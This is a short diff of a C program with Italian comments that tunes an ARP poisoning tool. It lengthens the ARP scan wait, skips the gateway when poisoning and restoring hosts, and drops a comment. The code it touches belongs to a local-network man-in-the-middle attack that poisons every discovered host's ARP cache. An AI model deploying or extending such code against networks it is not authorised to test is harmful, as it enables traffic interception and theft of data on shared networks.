@@ -274,7 +274,7 @@ static void scan_subnet_arp(void) {
         usleep(1000);
     }
 
-    printf("[*] in ascolto di risposte ARP per 3 secondi...\n");
+    printf("[*] in ascolto di risposte ARP per 4 secondi...\n");
     struct timeval start, now, tv;
     gettimeofday(&start, NULL);
     tv.tv_sec = 0;
@@ -284,7 +284,7 @@ static void scan_subnet_arp(void) {
     uint8_t buf[1024];
     while (1) {
         gettimeofday(&now, NULL);
-        if (now.tv_sec - start.tv_sec >= 3) break;
+        if (now.tv_sec - start.tv_sec >= 4) break;
 
         int len = recv(sock, buf, sizeof(buf), 0);
         if (len < 42) continue;
@@ -292,7 +292,6 @@ static void scan_subnet_arp(void) {
         struct frame *f = (struct frame *)buf;
         if (ntohs(f->eth_type) == ETH_P_ARP && ntohs(f->arp_oper) == 2) {
             if (memcmp(f->arp_spa, my_ip, 4) == 0) continue;
-            if (memcmp(f->arp_spa, gw_ip, 4) == 0) continue;
 
             int found = 0;
             for (int j = 0; j < n_hosts; j++) {
@@ -327,12 +326,16 @@ static void scan_subnet_arp(void) {
 
 static void process_ips(void) {
     for (int i = 0; i < n_hosts; i++) {
+        // Non avvelenare il gateway stesso
+        if (memcmp(hosts[i].ip, gw_ip, 4) == 0) continue;
         arpPoisoner(&hosts[i]);
     }
 }
 
 static void restore_ips(void) {
     for (int i = 0; i < n_hosts; i++) {
+        // Non ripristinare il gateway verso sé stesso
+        if (memcmp(hosts[i].ip, gw_ip, 4) == 0) continue;
         arpRestorer(&hosts[i]);
     }
 }
@@ -366,7 +369,6 @@ int main(int argc, char **argv) {
 
     signal(SIGINT, on_sigint);
 
-    // Carica il database dei vendor
     load_oui_db("vendorMacs.xml");
 
     if (get_iface_mac(iface, my_mac) < 0 || get_iface_ip(iface, my_ip) < 0) {
